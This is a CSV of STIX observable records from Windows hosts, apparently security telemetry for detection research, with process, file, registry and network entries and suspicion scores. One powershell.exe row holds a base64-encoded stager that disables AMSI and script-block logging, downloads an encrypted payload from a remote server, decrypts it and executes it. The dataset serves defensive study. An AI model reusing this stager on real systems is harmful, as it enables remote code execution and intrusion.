type,name,id,created,binary_ref.type,binary_ref.name,binary_ref.parent_directory_ref.type,binary_ref.parent_directory_ref.path,binary_ref.parent_directory_ref.id,binary_ref.id,pid,opened_connection_refs_count,creator_user_ref.type,creator_user_ref.user_id,creator_user_ref.id,x_contained_by_ref,first_observed,last_observed,number_observed,binary_ref.hashes.MD5,command_line,parent_ref.type,parent_ref.name,parent_ref.binary_ref.type,parent_ref.binary_ref.name,parent_ref.binary_ref.parent_directory_ref.type,parent_ref.binary_ref.parent_directory_ref.path,parent_ref.binary_ref.parent_directory_ref.id,parent_ref.binary_ref.id,parent_ref.pid,parent_ref.command_line,parent_ref.id,command_line_entropy,command_line_len,suspicion_score,opened_connection_refs
user-account,,user-account--527-7478-48f3-83c3-4bd727a141b8_6,,,,,,,,,,,,,observed-data--aedad527-7478-48f3-83c3-4bd727a141b8,2019-05-07T11:56:36.167Z,2019-05-07T11:56:36.167Z,1.0,,,,,,,,,,,,,,0.0,0,0,
directory,,directory--59b0ed1c-4478-44a6-963e-ba1cd29d1fba_2,,,,,,,,,,,,,observed-data--59b0ed1c-4478-44a6-963e-ba1cd29d1fba,2019-05-18T20:43:41.175Z,2019-05-18T20:43:41.175Z,1.0,,,,,,,,,,,,,,0.0,0,0,
process,powershell.exe,process--0eddb67e-5549-403b-8603-c9b6c4310cfc_0,,file,powershell.exe,directory,C:\Windows\System32\WindowsPowerShell\v1.0,directory--0eddb67e-5549-403b-8603-c9b6c4310cfc_2,file--0eddb67e-5549-403b-8603-c9b6c4310cfc_1,5204.0,,user-account,S-1-5-18,user-account--0eddb67e-5549-403b-8603-c9b6c4310cfc_4,observed-data--0eddb67e-5549-403b-8603-c9b6c4310cfc,2019-05-18T20:43:41.175Z,2019-05-18T20:43:41.175Z,1.0,,,,,,,,,,,,,,0.0,0,0,
process,powershell.exe,process--1490e90-e63a-4a26-bea9-7f76dccf4a3e_0,,file,powershell.exe,directory,C:\Windows\System32\WindowsPowerShell\v1.0,directory--1490e90-e63a-4a26-bea9-7f76dccf4a3e_2,file--1490e90-e63a-4a26-bea9-7f76dccf4a3e_1,5204.0,,user-account,S-1-5-18,user-account--1490e90-e63a-4a26-bea9-7f76dccf4a3e_4,observed-data--b1490e90-e63a-4a26-bea9-7f76dccf4a3e,2019-05-18T20:43:41.284Z,2019-05-18T20:43:41.284Z,1.0,,,,,,,,,,,,,,0.0,0,0,
user-account,,user-account--4a162463-ef19-466d-9b2d-d8f2da0a14a6_4,,,,,,,,,,,,,observed-data--4a162463-ef19-466d-9b2d-d8f2da0a14a6,2019-05-18T20:43:36.925Z,2019-05-18T20:43:36.925Z,1.0,,,,,,,,,,,,,,0.0,0,0,
ipv4-addr,,ipv4-addr--3819dc13-8abd-4c52-955c-d3eb12dde593_5,,,,,,,,,,,,,observed-data--3819dc13-8abd-4c52-955c-d3eb12dde593,2019-05-07T11:56:34.169Z,2019-05-07T11:56:34.169Z,1.0,,,,,,,,,,,,,,0.0,0,0,
directory,,directory--715601-4023-41a1-8ca9-4935dafbcc60_2,,,,,,,,,,,,,observed-data--dd715601-4023-41a1-8ca9-4935dafbcc60,2019-05-18T20:43:43.456Z,2019-05-18T20:43:43.456Z,1.0,,,,,,,,,,,,,,0.0,0,0,
observed-data,,observed-data--64f2487a-6b68-4499-b021-3430e794b111,2020-08-12T09:53:20.365Z,,,,,,,,,,,,,2019-05-07T11:56:27.104Z,2019-05-07T11:56:27.104Z,1.0,,,,,,,,,,,,,,0.0,0,0,
process,powershell.exe,process--5c1f9f6-d61b-4bbd-b542-403d9661f388_0,,file,powershell.exe,directory,C:\Windows\System32\WindowsPowerShell\v1.0,directory--5c1f9f6-d61b-4bbd-b542-403d9661f388_2,file--5c1f9f6-d61b-4bbd-b542-403d9661f388_1,5204.0,,user-account,S-1-5-18,user-account--5c1f9f6-d61b-4bbd-b542-403d9661f388_4,observed-data--a5c1f9f6-d61b-4bbd-b542-403d9661f388,2019-05-18T20:43:43.815Z,2019-05-18T20:43:43.815Z,1.0,,,,,,,,,,,,,,0.0,0,0,
file,notepad.exe,file--4e4e9ea7-5dd8-4fb9-ad26-4a9adf8dbcf9_1,,,,,,,,,,,,,observed-data--4e4e9ea7-5dd8-4fb9-ad26-4a9adf8dbcf9,2019-05-07T11:56:42.113Z,2019-05-07T11:56:42.113Z,1.0,,,,,,,,,,,,,,0.0,0,0,
network-traffic,,network-traffic--1f081c09-ae69-4058-a3d2-161b754aec6c_4,,,,,,,,,,,,,observed-data--1f081c09-ae69-4058-a3d2-161b754aec6c,2019-05-07T11:57:33.035Z,2019-05-07T11:57:33.035Z,1.0,,,,,,,,,,,,,,0.0,0,0,
windows-registry-key,,windows-registry-key--880e4eae-ae2e-4ba3-9ee7-f78253487d94_3,,,,,,,,,,,,,observed-data--880e4eae-ae2e-4ba3-9ee7-f78253487d94,2019-05-18T20:43:43.456Z,2019-05-18T20:43:43.456Z,1.0,,,,,,,,,,,,,,0.0,0,0,
process,powershell.exe,process--59b122e0-a2b7-4576-ae9f-431405aaa02e_3,,file,powershell.exe,directory,C:\Windows\System32\WindowsPowerShell\v1.0,directory--59b122e0-a2b7-4576-ae9f-431405aaa02e_5,file--59b122e0-a2b7-4576-ae9f-431405aaa02e_4,5204.0,,,,,observed-data--59b122e0-a2b7-4576-ae9f-431405aaa02e,2019-05-18T20:43:37.929Z,2019-05-18T20:43:37.929Z,1.0,,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -noP -sta -w 1 -enc  SQBGACgAJABQAFMAVgBlAHIAcwBJAE8AbgBUAEEAYgBMAGUALgBQAFMAVgBlAHIAcwBJAG8AbgAuAE0AYQBKAE8AcgAgAC0ARwBlACAAMwApAHsAJAA4AEQAQQBjADEAPQBbAFIARQBmAF0ALgBBAFMAcwBFAE0AQgBMAHkALgBHAGUAVABUAFkAUABFACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AVQB0AGkAbABzACcAKQAuACIARwBFAFQARgBJAEUAYABsAEQAIgAoACcAYwBhAGMAaABlAGQARwByAG8AdQBwAFAAbwBsAGkAYwB5AFMAZQB0AHQAaQBuAGcAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQA7AEkARgAoACQAOABEAEEAQwAxACkAewAkADMAMgBlADQARgA9ACQAOABkAEEAQwAxAC4ARwBlAHQAVgBBAGwAdQBlACgAJABuAHUATABMACkAOwBJAEYAKAAkADMAMgBFADQARgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdACkAewAkADMAMgBlADQARgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAAzADIARQA0AGYAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQBbACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnAF0APQAwAH0AJAB2AGEAbAA9AFsAQwBvAGwATABlAGMAVABJAG8AbgBTAC4ARwBFAG4ARQBSAGkAQwAuAEQASQBjAFQAaQBPAG4AQQByAHkAWwBTAHQAcgBpAG4ARwAsAFMAeQBTAHQAZQBNAC4ATwBiAEoAZQBjAFQAXQBdADoAOgBuAGUAVwAoACkAOwAkAHYAYQBMAC4AQQBkAGQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkAFYAQQBMAC4AQQBEAEQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQAMwAyAEUANABmAFsAJwBIAEsARQBZAF8ATABPAEMAQQBMAF8ATQBBAEMASABJAE4ARQBcAFMAbwBmAHQAdwBhAHIAZQBcAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwBcAFAAbwB3AGUAcgBTAGgAZQBsAGwAXABTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAkAFYAQQBsAH0ARQBMAFMARQB7AFsAUwBDAHIAaQBwAFQAQgBMAE8AYwBrAF0ALgAiAEcAZQBUAEYAaQBFAGAAbABkACIAKAAnAHMAaQBnAG4AYQB0AHUAcgBlAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAdABWAEEATABVAGUAKAAkAG4AVQBMAEwALAAoAE4AZQB3AC0ATwBiAGoARQBDAFQAIABDAE8AbABMAEUAQwBUAEkAbwBOAHMALgBHAEUAbgBlAFIASQBDAC4ASABBAFMASABTAGUAdABbAHMAdAByAEkAbgBnAF0AKQApAH0AJABSAEUARgA9AFsAUgBlAGYAXQAuAEEAcwBTAGUATQBCAEwAeQAuAEcAZQBUAFQAWQBwAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpAFUAdABpAGwAcwAnACkAOwAkAFIAZQBGAC4ARwBlAHQARgBpAEUAbABkACgAJwBhAG0AcwBpAEkAbgBpAHQARgBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAVABWAEEAbABVAEUAKAAkAE4AdQBsAGwALAAkAHQAcgB1AEUAKQA7AH0AOwBbAFMAeQBTAFQARQBNAC4ATgBlAHQALgBTAEUAcgBWAGkAQwBFAFAATwBJAG4AdABNAGEATgBBAEcARQBSAF0AOgA6AEUAeABQAEUAQwBUADEAMAAwAEMATwBuAFQAaQBuAFUARQA9ADAAOwAkADQAMwBFAGYAMwA9AE4ARQB3AC0ATwBiAEoARQBjAFQAIABTAHkAcwB0AEUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAEkAZQBOAHQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAWwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBlAHIAdgBpAGMAZQBQAG8AaQBuAHQATQBhAG4AYQBnAGUAcgBdADoAOgBTAGUAcgB2AGUAcgBDAGUAcgB0AGkAZgBpAGMAYQB0AGUAVgBhAGwAaQBkAGEAdABpAG8AbgBDAGEAbABsAGIAYQBjAGsAIAA9ACAAewAkAHQAcgB1AGUAfQA7ACQANAAzAGUAZgAzAC4ASABFAGEAZABlAFIAcwAuAEEAZABEACgAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcALAAkAHUAKQA7ACQANAAzAGUARgAzAC4ASABlAGEAZABlAHIAcwAuAEEARABkACgAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcALAAkAHUAKQA7ACQANAAzAGUAZgAzAC4AUAByAG8AeAB5AD0AWwBTAFkAUwB0AGUATQAuAE4AZQB0AC4AVwBFAEIAUgBlAHEAdQBlAHMAVABdADoAOgBEAEUARgBhAFUAbAB0AFcAZQBCAFAAUgBPAFgAeQA7ACQANAAzAGUAZgAzAC4AUABSAG8AeAB5AC4AQwBSAGUAZABFAG4AVABpAGEAbABTACAAPQAgAFsAUwBZAHMAVABlAG0ALgBOAGUAdAAuAEMAcgBlAGQARQBuAHQASQBBAEwAQwBhAGMAaABlAF0AOgA6AEQARQBGAEEAdQBMAHQATgBlAFQAdwBPAFIASwBDAHIARQBEAGUAbgB0AGkAYQBMAHMAOwAkAFMAYwByAGkAcAB0ADoAUAByAG8AeAB5ACAAPQAgACQANAAzAGUAZgAzAC4AUAByAG8AeAB5ADsAJABLAD0AWwBTAHkAcwBUAGUAbQAuAFQAZQB4AFQALgBFAG4AYwBvAGQAaQBOAEcAXQA6ADoAQQBTAEMASQBJAC4ARwBFAFQAQgBZAHQARQBTACgAJwB+AGsAKgBfAEYAUwBqAHIAOAAlAHgAdwBlAEoANgBoAHwAUABLAC4AZgB7AFUATgBNAEgAdQBkAHAANQB5AG0AJwApADsAJABSAD0AewAkAEQALAAkAEsAPQAkAEEAcgBHAHMAOwAkAFMAPQAwAC4ALgAyADUANQA7ADAALgAuADIANQA1AHwAJQB7ACQASgA9ACgAJABKACsAJABTAFsAJABfAF0AKwAkAEsAWwAkAF8AJQAkAEsALgBDAE8AdQBuAFQAXQApACUAMgA1ADYAOwAkAFMAWwAkAF8AXQAsACQAUwBbACQASgBdAD0AJABTAFsAJABKAF0ALAAkAFMAWwAkAF8AXQB9ADsAJABEAHwAJQB7ACQASQA9ACgAJABJACsAMQApACUAMgA1ADYAOwAkAEgAPQAoACQASAArACQAUwBbACQASQBdACkAJQAyADUANgA7ACQAUwBbACQASQBdACwAJABTAFsAJABIAF0APQAkAFMAWwAkAEgAXQAsACQAUwBbACQASQBdADsAJABfAC0AYgB4AE8AcgAkAFMAWwAoACQAUwBbACQASQBdACsAJABTAFsAJABIAF0AKQAlADIANQA2AF0AfQB9ADsAJABzAGUAcgA9ACQAKABbAFQAZQBYAHQALgBFAE4AQwBvAEQASQBOAEcAXQA6ADoAVQBOAGkAYwBPAEQAZQAuAEcARQB0AFMAdAByAGkATgBHACgAWwBDAE8ATgB2AGUAcgBUAF0AOgA6AEYAUgBvAG0AQgBBAHMARQA2ADQAUwB0AFIAaQBOAGcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQgB6AEEARABvAEEATAB3AEEAdgBBAEQARQBBAE0AQQBBAHUAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAeABBAEQAQQBBAE4AZwBBAD0AJwApACkAKQA7ACQAdAA9ACcALwBuAGUAdwBzAC4AcABoAHAAJwA7ACQANAAzAEUAZgAzAC4ASABlAEEAZABFAHIAUwAuAEEAZABEACgAIgBDAG8AbwBrAGkAZQAiACwAIgBIAFkAdgBsAFAASgBNAG0AcwBrAHkATgBGAFQAawA9AHoAbwBqADAAdgBDAE0ATwBsAFYAZQByADIARgBJAFMAZgBpAEYAawBSAEMAagBsAHIAOABjAD0AIgApADsAJABEAGEAVABhAD0AJAA0ADMARQBmADMALgBEAE8AdwBuAGwAbwBBAEQARABBAFQAYQAoACQAUwBlAHIAKwAkAFQAKQA7ACQAaQB2AD0AJABEAGEAVABBAFsAMAAuAC4AMwBdADsAJABEAEEAdABBAD0AJABkAEEAVABBAFsANAAuAC4AJABkAEEAdABBAC4AbABlAE4ARwB0AEgAXQA7AC0AagBvAGkAbgBbAEMASABhAHIAWwBdAF0AKAAmACAAJABSACAAJABEAEEAdABhACAAKAAkAEkAVgArACQASwApACkAfABJAEUAWAA=",,,,,,,,,,,,4.404711493232643,5477,2,
process,cmd.exe,process--fe514e31-a0bf-4407-8cc4-5c95c37b0103_3,,file,cmd.exe,directory,C:\Windows\System32,directory--fe514e31-a0bf-4407-8cc4-5c95c37b0103_5,file--fe514e31-a0bf-4407-8cc4-5c95c37b0103_4,6732.0,,,,,observed-data--fe514e31-a0bf-4407-8cc4-5c95c37b0103,2019-05-18T20:43:36.728Z,2019-05-18T20:43:36.728Z,1.0,,,,,,,,,,,,,,0.0,0,0,
directory,,directory--4607d9d6-f28e-46ac-9f8c-2c91930f0d09_2,,,,,,,,,,,,,observed-data--4607d9d6-f28e-46ac-9f8c-2c91930f0d09,2019-05-18T20:43:49.847Z,2019-05-18T20:43:49.847Z,1.0,,,,,,,,,,,,,,0.0,0,0,
file,powershell.exe,file--65d829f3-c7d6-4405-a71d-949f68256305_1,,,,,,,,,,,,,observed-data--65d829f3-c7d6-4405-a71d-949f68256305,2019-05-18T20:43:41.175Z,2019-05-18T20:43:41.175Z,1.0,,,,,,,,,,,,,,0.0,0,0,
process,powershell.exe,process--67f486d-69f0-4e59-9180-859dc7dc3cd6_0,,file,powershell.exe,directory,C:\Windows\System32\WindowsPowerShell\v1.0,directory--67f486d-69f0-4e59-9180-859dc7dc3cd6_2,file--67f486d-69f0-4e59-9180-859dc7dc3cd6_1,5204.0,,user-account,S-1-5-18,user-account--67f486d-69f0-4e59-9180-859dc7dc3cd6_4,observed-data--a67f486d-69f0-4e59-9180-859dc7dc3cd6,2019-05-18T20:43:45.753Z,2019-05-18T20:43:45.753Z,1.0,,,,,,,,,,,,,,0.0,0,0,
process,powershell.exe,process--59b0ed1c-4478-44a6-963e-ba1cd29d1fba_0,,file,powershell.exe,directory,C:\Windows\System32\WindowsPowerShell\v1.0,directory--59b0ed1c-4478-44a6-963e-ba1cd29d1fba_2,file--59b0ed1c-4478-44a6-963e-ba1cd29d1fba_1,5204.0,,user-account,S-1-5-18,user-account--59b0ed1c-4478-44a6-963e-ba1cd29d1fba_4,observed-data--59b0ed1c-4478-44a6-963e-ba1cd29d1fba,2019-05-18T20:43:41.175Z,2019-05-18T20:43:41.175Z,1.0,,,,,,,,,,,,,,0.0,0,0,
directory,,directory--412b1231-a203-4407-aca6-74003fcdacde_2,,,,,,,,,,,,,observed-data--412b1231-a203-4407-aca6-74003fcdacde,2019-05-18T20:43:10.569Z,2019-05-18T20:43:10.569Z,1.0,,,,,,,,,,,,,,0.0,0,0,
file,wmiprvse.exe,file--8a8755e8-d04e-4cdc-84ca-7a7cc0593a1a_1,,,,,,,,,,,,,observed-data--8a8755e8-d04e-4cdc-84ca-7a7cc0593a1a,2019-05-18T20:43:46.487Z,2019-05-18T20:43:46.487Z,1.0,,,,,,,,,,,,,,0.0,0,0,
ipv4-addr,,ipv4-addr--301239b8-08d9-4bc3-84e3-d8edf2465984_5,,,,,,,,,,,,,observed-data--301239b8-08d9-4bc3-84e3-d8edf2465984,2019-05-07T11:57:12.840Z,2019-05-07T11:57:12.840Z,1.0,,,,,,,,,,,,,,0.0,0,0,
ipv4-addr,,ipv4-addr--69bd85fe-0e42-4597-a73f-149ed069e1ac_3,,,,,,,,,,,,,observed-data--69bd85fe-0e42-4597-a73f-149ed069e1ac,2019-05-18T20:43:41.577Z,2019-05-18T20:43:41.577Z,1.0,,,,,,,,,,,,,,0.0,0,0,
user-account,,user-account--5711c229-d657-4f27-94e9-dc03ba7e4335_4,,,,,,,,,,,,,observed-data--5711c229-d657-4f27-94e9-dc03ba7e4335,2019-05-18T20:43:23.378Z,2019-05-18T20:43:23.378Z,1.0,,,,,,,,,,,,,,0.0,0,0,
observed-data,,observed-data--91a4c548-fa2b-4ca3-b0ba-05e35108cdf9,2020-08-12T09:53:20.455Z,,,,,,,,,,,,,2019-05-18T20:43:41.175Z,2019-05-18T20:43:41.175Z,1.0,,,,,,,,,,,,,,0.0,0,0,
process,powershell.exe,process--3d2fe359-6ccf-4076-83f3-5bba5c13ea2e_0,,file,powershell.exe,directory,C:\Windows\System32\WindowsPowerShell\v1.0,directory--3d2fe359-6ccf-4076-83f3-5bba5c13ea2e_2,file--3d2fe359-6ccf-4076-83f3-5bba5c13ea2e_1,5204.0,,user-account,S-1-5-18,user-account--3d2fe359-6ccf-4076-83f3-5bba5c13ea2e_4,observed-data--3d2fe359-6ccf-4076-83f3-5bba5c13ea2e,2019-05-18T20:43:41.175Z,2019-05-18T20:43:41.175Z,1.0,,,,,,,,,,,,,,0.0,0,0,
directory,,directory--5eeb78bb-1080-46e5-924a-a6c3cb27ded8_2,,,,,,,,,,,,,observed-data--5eeb78bb-1080-46e5-924a-a6c3cb27ded8,2019-05-18T20:43:41.175Z,2019-05-18T20:43:41.175Z,1.0,,,,,,,,,,,,,,0.0,0,0,
observed-data,,observed-data--00011df9-327f-46a9-bd35-280f5f77cf20,2020-08-12T09:53:20.446Z,,,,,,,,,,,,,2019-05-18T20:43:41.175Z,2019-05-18T20:43:41.175Z,1.0,,,,,,,,,,,,,,0.0,0,0,
observed-data,,observed-data--66f227ab-119d-43cd-b97d-328d68fa28ae,2020-08-12T09:53:20.551Z,,,,,,,,,,,,,2019-05-18T20:43:46.440Z,2019-05-18T20:43:46.440Z,1.0,,,,,,,,,,,,,,0.0,0,0,
directory,,directory--c3e52283-3367-4051-8684-3dbe9514a0a6_2,,,,,,,,,,,,,observed-data--c3e52283-3367-4051-8684-3dbe9514a0a6,2019-05-18T20:43:41.269Z,2019-05-18T20:43:41.269Z,1.0,,,,,,,,,,,,,,0.0,0,0,
windows-registry-key,,windows-registry-key--17490818-c86b-4bce-9b73-d92ea759b17b_3,,,,,,,,,,,,,observed-data--17490818-c86b-4bce-9b73-d92ea759b17b,2019-05-18T20:43:41.175Z,2019-05-18T20:43:41.175Z,1.0,,,,,,,,,,,,,,0.0,0,0,
directory,,directory--04f4c82-477c-49ea-9f5d-03f2c3cd564f_2,,,,,,,,,,,,,observed-data--a04f4c82-477c-49ea-9f5d-03f2c3cd564f,2019-05-18T20:43:41.175Z,2019-05-18T20:43:41.175Z,1.0,,,,,,,,,,,,,,0.0,0,0,
observed-data,,observed-data--7552235a-52d4-4be3-b87d-01a2dd750e10,2020-08-12T09:53:20.526Z,,,,,,,,,,,,,2019-05-18T20:43:43.831Z,2019-05-18T20:43:43.831Z,1.0,,,,,,,,,,,,,,0.0,0,0,
ipv4-addr,,ipv4-addr--6f6a48b8-c10b-406d-93ca-c03d3352a339_5,,,,,,,,,,,,,observed-data--6f6a48b8-c10b-406d-93ca-c03d3352a339,2019-05-07T11:57:48.573Z,2019-05-07T11:57:48.573Z,1.0,,,,,,,,,,,,,,0.0,0,0,
observed-data,,observed-data--8c99bf08-2748-4234-a4ef-8725e36312dd,2020-08-12T09:53:20.395Z,,,,,,,,,,,,,2019-05-18T20:42:42.810Z,2019-05-18T20:42:42.810Z,1.0,,,,,,,,,,,,,,0.0,0,0,
observed-data,,observed-data--f98d7e2b-27ef-4f85-b56a-63f63496bbb9,2020-08-12T09:53:20.412Z,,,,,,,,,,,,,2019-05-18T20:43:37.862Z,2019-05-18T20:43:37.862Z,1.0,,,,,,,,,,,,,,0.0,0,0,
network-traffic,,network-traffic--5d571cfe-0f64-4408-9dec-895a29ada2fb_4,,,,,,,,,,,,,observed-data--5d571cfe-0f64-4408-9dec-895a29ada2fb,2019-05-07T11:56:46.558Z,2019-05-07T11:56:46.558Z,1.0,,,,,,,,,,,,,,0.0,0,0,
observed-data,,observed-data--4078fab1-b30f-4699-bd5f-93d2406bd4d6,2020-08-12T09:53:20.475Z,,,,,,,,,,,,,2019-05-18T20:43:41.284Z,2019-05-18T20:43:41.284Z,1.0,,,,,,,,,,,,,,0.0,0,0,
network-traffic,,network-traffic--caa8e404-108d-4bd5-9a87-c2109661fb8c_4,,,,,,,,,,,,,observed-data--caa8e404-108d-4bd5-9a87-c2109661fb8c,2019-05-18T20:43:10.585Z,2019-05-18T20:43:10.585Z,1.0,,,,,,,,,,,,,,0.0,0,0,
network-traffic,,network-traffic--6a52c957-2ccf-4281-b5a3-68f56a3c0757_4,,,,,,,,,,,,,observed-data--6a52c957-2ccf-4281-b5a3-68f56a3c0757,2019-05-07T11:57:23.027Z,2019-05-07T11:57:23.027Z,1.0,,,,,,,,,,,,,,0.0,0,0,
windows-registry-key,,windows-registry-key--c3e52283-3367-4051-8684-3dbe9514a0a6_3,,,,,,,,,,,,,observed-data--c3e52283-3367-4051-8684-3dbe9514a0a6,2019-05-18T20:43:41.269Z,2019-05-18T20:43:41.269Z,1.0,,,,,,,,,,,,,,0.0,0,0,
windows-registry-key,,windows-registry-key--c035171f-22d9-42bf-9958-49b63e1d3c88_3,,,,,,,,,,,,,observed-data--c035171f-22d9-42bf-9958-49b63e1d3c88,2019-05-18T20:44:21.956Z,2019-05-18T20:44:21.956Z,1.0,,,,,,,,,,,,,,0.0,0,0,
observed-data,,observed-data--62a47ba3-caae-40c0-a699-2189a710fda6,2020-08-12T09:53:20.503Z,,,,,,,,,,,,,2019-05-18T20:43:43.300Z,2019-05-18T20:43:43.300Z,1.0,,,,,,,,,,,,,,0.0,0,0,
observed-data,,observed-data--c3693eaa-bed6-4c0f-8827-c180fbe7be78,2020-08-12T09:53:20.508Z,,,,,,,,,,,,,2019-05-18T20:43:43.456Z,2019-05-18T20:43:43.456Z,1.0,,,,,,,,,,,,,,0.0,0,0,
user-account,,user-account--8a8755e8-d04e-4cdc-84ca-7a7cc0593a1a_4,,,,,,,,,,,,,observed-data--8a8755e8-d04e-4cdc-84ca-7a7cc0593a1a,2019-05-18T20:43:46.487Z,2019-05-18T20:43:46.487Z,1.0,,,,,,,,,,,,,,0.0,0,0,
process,wmiprvse.exe,process--6d8a3f01-48a3-4165-9b1a-d9a7aebb3ab4_0,,file,wmiprvse.exe,directory,C:\Windows\system32\wbem,directory--6d8a3f01-48a3-4165-9b1a-d9a7aebb3ab4_2,file--6d8a3f01-48a3-4165-9b1a-d9a7aebb3ab4_1,7664.0,,user-account,S-1-5-18,user-account--6d8a3f01-48a3-4165-9b1a-d9a7aebb3ab4_4,observed-data--6d8a3f01-48a3-4165-9b1a-d9a7aebb3ab4,2019-05-18T20:43:46.440Z,2019-05-18T20:43:46.440Z,1.0,,,,,,,,,,,,,,0.0,0,0,
process,powershell.exe,process--f4dc8-ee24-4492-9b28-aa5b710cf37a_0,,file,powershell.exe,directory,C:\Windows\System32\WindowsPowerShell\v1.0,directory--f4dc8-ee24-4492-9b28-aa5b710cf37a_2,file--f4dc8-ee24-4492-9b28-aa5b710cf37a_1,5204.0,,user-account,S-1-5-18,user-account--f4dc8-ee24-4492-9b28-aa5b710cf37a_4,observed-data--dbef4dc8-ee24-4492-9b28-aa5b710cf37a,2019-05-18T20:43:41.175Z,2019-05-18T20:43:41.175Z,1.0,,,,,,,,,,,,,,0.0,0,0,
observed-data,,observed-data--6e9d116a-4662-4799-b6c3-af31372969ce,2020-08-12T09:53:20.461Z,,,,,,,,,,,,,2019-05-18T20:43:41.175Z,2019-05-18T20:43:41.175Z,1.0,,,,,,,,,,,,,,0.0,0,0,
process,powershell.exe,process--8d9a3f0-a0bf-466c-bbca-1072e6d14572_0,,file,powershell.exe,directory,C:\Windows\System32\WindowsPowerShell\v1.0,directory--8d9a3f0-a0bf-466c-bbca-1072e6d14572_2,file--8d9a3f0-a0bf-466c-bbca-1072e6d14572_1,5204.0,,user-account,S-1-5-18,user-account--8d9a3f0-a0bf-466c-bbca-1072e6d14572_4,observed-data--e8d9a3f0-a0bf-466c-bbca-1072e6d14572,2019-05-18T20:43:45.753Z,2019-05-18T20:43:45.753Z,1.0,,,,,,,,,,,,,,0.0,0,0,
observed-data,,observed-data--44f4c91e-41f8-4478-8f4a-796b20c51bcc,2020-08-12T09:53:20.410Z,,,,,,,,,,,,,2019-05-18T20:43:37.831Z,2019-05-18T20:43:37.831Z,1.0,,,,,,,,,,,,,,0.0,0,0,
file,powershell.exe,file--58c5b320-7e46-4d43-a57d-a9a949baf28e_1,,,,,,,,,,,,,observed-data--58c5b320-7e46-4d43-a57d-a9a949baf28e,2019-05-18T20:43:43.456Z,2019-05-18T20:43:43.456Z,1.0,,,,,,,,,,,,,,0.0,0,0,
